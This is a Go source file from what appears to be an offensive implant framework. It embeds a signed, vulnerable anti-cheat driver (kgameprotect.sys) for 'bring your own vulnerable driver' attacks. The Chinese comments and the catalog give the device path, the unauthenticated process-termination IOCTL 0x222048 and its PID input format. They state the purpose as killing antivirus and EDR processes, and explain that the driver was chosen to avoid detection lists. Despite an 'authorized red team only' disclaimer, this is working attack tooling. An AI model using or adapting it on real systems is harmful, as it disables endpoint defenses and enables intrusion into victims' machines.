// Package drivers 内置"已签名但易受攻击"的 BYOVD 利用驱动（原厂二进制）：
//
//	kgameprotect.sys — 国产游戏反作弊驱动（WHQL / Microsoft Windows Hardware
//	                   Compatibility Publisher 认证签名，AMD64）：
//	                   设备 `\\.\kgameprotect`，IOCTL `0x222048`
//	                   （METHOD_BUFFERED + FILE_ANY_ACCESS）入参首个 DWORD 为 PID，
//	                   驱动内部直接 PsLookupProcessByProcessId → ObOpenObjectByPointer
//	                   (PROCESS_TERMINATE) → ZwTerminateProcess，**无需调用方权限**，
//	                   因此可用于终止普通杀软/EDR 进程（对 PPL 保护进程仍会失败）。
//
// 为什么换掉 RTCore64.sys：RTCore64（MSI Afterburner，CVE-2019-16098）提供"任意物理/虚拟
// 地址读写"，被微软易受攻击驱动黑名单与几乎所有杀软重点标记，一落地就被查杀；而本驱动是
// 新出现的、仅暴露"进程终止"这一个无鉴权 IOCTL 的 WHQL 驱动，落地特征面更小，定位是
// **EDR/杀软进程击杀**（不做任意内核读写，因此不再提供"内核虚拟地址改 EPROCESS.Protection"
// 的 PPL 清除路线；PPL 清除改走句柄窃取路线，见植入端 ppl_kill）。
//
// 二进制与元数据来源：LOLDrivers PR #428（Add vulnerable kgameprotect.sys
// process-termination driver），SHA-256 `6c1d596d…126ee` 与 PR 记录一致，
// Authenticode 校验结果 Valid（签名者 Microsoft Windows Hardware Compatibility
// Publisher）。加载前请自行用 `Get-AuthenticodeSignature` / signtool 复核。
//
// ⚠️ 仅供授权红队/渗透测试使用；加载后请及时 byovd_unload 卸载。
package drivers

import (
	"crypto/sha256"
	"embed"
	"encoding/hex"
	"fmt"
	"sort"
)

//go:embed kgameprotect.sys
var FS embed.FS

// Driver 描述一个内置驱动。
type Driver struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	// Purpose 驱动用途：kill = 无鉴权进程终止（byovd_kill）；rw = 任意内核读写。
	Purpose string `json:"purpose"`
	Device  string `json:"device"`  // 加载后设备路径（byovd_kill 默认打开该设备）
	Service string `json:"service"` // 建议的 SCM 服务名
	// IOCTL 终止进程的 IOCTL 码（METHOD_BUFFERED）：入参首个 DWORD = PID。
	IOCTL uint32 `json:"ioctl"`
	// KillPIDSize 终止 IOCTL 的 PID 字段字节数（InputBufferLength 校验用）。
	KillPIDSize uint32 `json:"kill_pid_size"`
	Size        int64  `json:"size"`
	SHA256      string `json:"sha256"`
	Signed      string `json:"signed"` // 签名者信息（人工核对用）
}

// Catalog 内置驱动目录。
var Catalog = []Driver{
	{
		Name:        "kgameprotect.sys",
		Description: "游戏反作弊驱动（WHQL 签名）：无鉴权进程终止 IOCTL 0x222048，用于击杀普通杀软/EDR 进程（PPL 进程无效）",
		Purpose:     "kill",
		Device:      `\\.\kgameprotect`,
		Service:     "kgameprotect",
		IOCTL:       0x222048,
		KillPIDSize: 4,
		Signed:      "Microsoft Windows Hardware Compatibility Publisher (WHQL)",
	},
}

// List 返回驱动目录（附带实时大小与 SHA-256）。
func List() []Driver {
	out := make([]Driver, len(Catalog))
	copy(out, Catalog)
	for i := range out {
		if data, err := FS.ReadFile(out[i].Name); err == nil {
			out[i].Size = int64(len(data))
			h := sha256.Sum256(data)
			out[i].SHA256 = hex.EncodeToString(h[:])
		}
	}
	sort.Slice(out, func(a, b int) bool { return out[a].Name < out[b].Name })
	return out
}

// Get 返回指定名称驱动的信息与原始字节。
func Get(name string) (Driver, []byte, error) {
	for _, d := range Catalog {
		if d.Name == name {
			data, err := FS.ReadFile(name)
			if err != nil {
				return d, nil, err
			}
			return d, data, nil
		}
	}
	return Driver{}, nil, fmt.Errorf("unknown driver: %s", name)
}

// KillProfile 返回默认的"进程终止"驱动档案（byovd_kill 用）。
func KillProfile() (Driver, bool) {
	for _, d := range Catalog {
		if d.Purpose == "kill" {
			return d, true
		}
	}
	return Driver{}, false
}
